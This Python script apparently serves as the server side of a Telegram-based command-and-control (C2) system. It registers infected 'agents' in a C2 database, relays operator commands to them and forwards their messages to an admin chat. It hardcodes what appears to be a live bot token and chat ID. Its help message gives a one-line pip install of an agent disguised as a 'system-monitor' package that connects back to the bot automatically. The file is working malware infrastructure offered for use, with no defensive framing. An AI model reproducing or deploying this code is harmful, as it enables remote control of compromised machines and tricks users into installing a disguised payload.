#!/usr/bin/env python3
"""
Telegram C2 Bot - Runs alongside C2 server
Handles commands and notifications from agents
Integrates with C2 SQLite database
"""

import os
import sys
import json
import time
import re
import sqlite3
import threading
import requests
from datetime import datetime
from pathlib import Path

# Configuration
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
CHAT_ID = os.environ.get("TG_CHAT_ID", "5804150664")
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_INTERVAL = 3

# Database path
BASE_DIR = Path(__file__).resolve().parent.parent
DB_PATH = BASE_DIR / "data" / "c2.db"

# State
last_update_id = 0
agents = {}

def get_db():
    """Get database connection."""
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="linux", arch="x64"):
    """Save or update agent in C2 database."""
    try:
        conn = get_db()
        db = conn.cursor()
        
        # Check if exists
        db.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
        existing = db.fetchone()
        
        if existing:
            # Update last_seen
            db.execute("""
                UPDATE agents 
                SET last_seen=datetime('now'), is_alive=1, hostname=?, platform_type=?
                WHERE id=?
            """, (hostname, platform, agent_id))
            print(f"[TG-DB] Updated agent {agent_id[:8]}")
        else:
            # Insert new agent
            db.execute("""
                INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type, is_alive)
                VALUES (?, ?, ?, ?, ?, ?, ?, 1)
            """, (agent_id, hostname, username, os_type, arch, "telegram", platform))
            print(f"[TG-DB] Inserted agent {agent_id[:8]}")
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[TG-DB-ERROR] {e}")
        return False

def send_message(text, chat_id=None, parse_mode="HTML"):
    """Send message via Telegram API."""
    url = f"{API_BASE}/sendMessage"
    data = {
        "chat_id": chat_id or CHAT_ID,
        "text": text[:4000],
        "parse_mode": parse_mode
    }
    try:
        resp = requests.post(url, json=data, timeout=10)
        return resp.json()
    except Exception as e:
        print(f"[TG-ERROR] Send failed: {e}")
        return {"ok": False, "error": str(e)}

def get_updates(offset=0, timeout=30):
    """Get updates from Telegram."""
    url = f"{API_BASE}/getUpdates"
    params = {"timeout": timeout, "offset": offset}
    try:
        resp = requests.get(url, params=params, timeout=timeout+5)
        return resp.json()
    except Exception as e:
        print(f"[TG-ERROR] Get updates failed: {e}")
        return {"ok": False, "result": []}

def handle_command(message):
    """Handle bot commands."""
    text = message.get("text", "")
    chat_id = message["chat"]["id"]
    user = message["from"].get("first_name", "User")
    
    print(f"[TG-CMD] {user}: {text}")
    
    if text == "/start":
        send_message(f"""🤖 <b>C2 Bot Online</b>

Welcome, {user}!

<b>Commands:</b>
/status - Show connected agents
/agents - List all agents
/help - Show help

<b>Agent auto-connects when started.</b>
""", chat_id)
    
    elif text == "/status":
        send_message(f"""📊 <b>C2 Status</b>

Server: <code>Running</code>
Agents: <code>{len(agents)} connected</code>
Time: <code>{datetime.now().isoformat()}</code>
""", chat_id)
    
    elif text == "/agents":
        if not agents:
            send_message("📭 No agents connected", chat_id)
        else:
            msg = "📋 <b>Connected Agents:</b>\n\n"
            for aid, info in agents.items():
                msg += f"• <code>{aid[:8]}</code> - {info.get('platform', 'unknown')}\n"
            send_message(msg, chat_id)
    
    elif text == "/help":
        send_message("""📖 <b>C2 Bot Help</b>

<b>Commands:</b>
/start - Start bot
/status - Server status
/agents - List agents
/help - This message

<b>Agent Usage:</b>
<code>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</code>

Agent will auto-connect to this bot.
""", chat_id)
    
    else:
        # Unknown command - forward to all agents as task
        send_message(f"📤 Command forwarded to agents: {text}", chat_id)

def handle_agent_message(message):
    """Handle messages from agents (contains agent data)."""
    text = message.get("text", "")
    chat_id = message["chat"]["id"]
    
    # Parse agent registration message
    # Format: "🤖 Agent Online\nID: xxx\nPlatform: xxx\nHostname: xxx"
    agent_id = None
    hostname = "unknown"
    platform = "unknown"
    
    # Extract agent ID
    id_match = re.search(r'ID[:\s]+([a-f0-9\-]{8,})', text, re.IGNORECASE)
    if id_match:
        agent_id = id_match.group(1)
    
    # Extract hostname
    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
    if host_match:
        hostname = host_match.group(1).strip()
    
    # Extract platform
    plat_match = re.search(r'Platform[:\s]+([^\n]+)', text, re.IGNORECASE)
    if plat_match:
        platform = plat_match.group(1).strip()
    
    # If found agent data, save to database
    if agent_id:
        agents[agent_id] = {
            "chat_id": chat_id,
            "platform": platform,
            "hostname": hostname,
            "last_seen": datetime.now().isoformat()
        }
        
        # Save to C2 database
        save_agent_to_db(agent_id, hostname, platform)
        print(f"[TG-AGENT] Registered: {agent_id[:8]} ({hostname})")
        
        # Notify admin
        send_message(f"🤖 <b>New Agent Online</b>\n\nID: <code>{agent_id[:8]}</code>\nHostname: {hostname}\nPlatform: {platform}", CHAT_ID)
    
    # Forward all agent messages to admin
    if chat_id != int(CHAT_ID):
        send_message(f"📩 Agent message:\n{text[:500]}", CHAT_ID)

def poll_loop():
    """Main polling loop."""
    global last_update_id
    
    print(f"[TG-START] Bot polling started")
    print(f"[TG-INFO] Token: {BOT_TOKEN[:20]}...")
    print(f"[TG-INFO] Admin chat: {CHAT_ID}")
    
    # Send startup message
    send_message("🚀 <b>C2 Bot Started</b>\n\nServer is online and ready.")
    
    while True:
        try:
            result = get_updates(offset=last_update_id + 1, timeout=POLL_INTERVAL)
            
            if result.get("ok"):
                for update in result.get("result", []):
                    last_update_id = update["update_id"]
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        
                        # Handle commands from admin
                        if chat_id == int(CHAT_ID):
                            handle_command(msg)
                        else:
                            # Message from agent
                            handle_agent_message(msg)
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n[TG-STOP] Bot stopped")
            break
        except Exception as e:
            print(f"[TG-ERROR] Poll error: {e}")
            time.sleep(5)

def main():
    """Entry point."""
    print("=" * 60)
    print("Telegram C2 Bot v1.0")
    print("=" * 60)
    
    # Test connection
    try:
        resp = requests.get(f"{API_BASE}/getMe", timeout=10)
        data = resp.json()
        if data.get("ok"):
            bot = data["result"]
            print(f"[TG-OK] Bot: @{bot['username']} ({bot['first_name']})")
        else:
            print(f"[TG-ERROR] Bot check failed: {data}")
            return
    except Exception as e:
        print(f"[TG-ERROR] Connection failed: {e}")
        return
    
    # Start polling
    poll_loop()

if __name__ == "__main__":
    main()
